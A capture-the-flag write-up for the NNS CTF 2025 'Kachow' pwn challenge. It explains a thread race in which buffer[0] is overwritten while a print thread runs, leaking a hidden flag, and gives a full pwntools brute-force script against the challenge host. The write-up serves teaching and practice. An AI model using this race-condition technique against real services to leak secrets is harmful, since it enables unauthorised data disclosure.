# Kachow – NNS CTF 2025 (PWN)

## Challenge description
> *"You might be fast, but are you faster than libc?"*  

We are given a C binary that allows us to:
1. Fill a buffer with user input (`fgets`).
2. Load the flag into the buffer (but overwrite the first byte with `'\0'`).
3. Print the buffer content using a new thread.
4. Exit.

---

## Vulnerable code

```c
void load_flag(char *addr) {
    char *flagptr = getenv("FLAG");
    addr[0] = '\0'; // now getting the flag is impossible
    strncpy(addr+1, flagptr, 127);
    printf("Successfully placed flag in buffer.\n");
}

void *print_buffer(void *addr) {
    printf("Buffer content: %s\n", (char *)addr);
    return 0;
}
```

The flag is stored at `buffer[1..]` with `buffer[0] = '\0'`, so a normal print shows nothing.

## Vulnerability

- `load_flag()` null-terminates the buffer, hiding the flag.
- `print_buffer()` runs in a new thread with `printf("%s")`.
- `fill_buffer()` lets us overwrite `buffer[0]` with user input.

Because `printf` runs in another thread, we can race:
1. Load the flag (`2`).
2. Start printing (`3`).
3. Immediately overwrite `buffer[0]` via `fill_buffer` (`1` + `"A"`).

If timed correctly, the print thread will output:
```
Buffer content: A<flag>
```

## Exploit

We brute force the race with pwntools, sending `2 → 3 → 1` rapidly and overwriting `buffer[0]`. With enough tries, the flag leaks.
```python
from pwn import *
import re, time, random

HOST = "70e7f76a-ab7b-4ed2-9f53-715dd995652d.chall.nnsc.tf"
PORT = 41337

FLAG_RE = re.compile(rb"(NNS\{[^}\n]*\})")

def sync_prompt(io):
    io.recvuntil(b"> ")

def attempt(io):
    io.sendline(b"2")            # load flag
    time.sleep(random.uniform(0, 0.003))
    io.sendline(b"3")            # print (threaded)
    time.sleep(random.uniform(0, 0.003))
    io.sendline(b"1")            # fill buffer
    io.send(b"A")                # overwrite buffer[0]
    time.sleep(random.uniform(0, 0.004))

    try:
        io.recvuntil(b"Buffer content: ", timeout=0.08)
        line = io.recvline(timeout=0.08)
        m = FLAG_RE.search(line)
        if m:
            return m.group(1).decode()
    except EOFError:
        return None

    io.send(b"\n")
    sync_prompt(io)

def main():
    io = remote(HOST, PORT, ssl=True)
    sync_prompt(io)

    for i in range(5000):
        flag = attempt(io)
        if flag:
            print(f"[+] Flag found: {flag}")
            break
        if i % 100 == 0:
            print(f"[.] Attempt {i}")

if __name__ == "__main__":
    main()

```
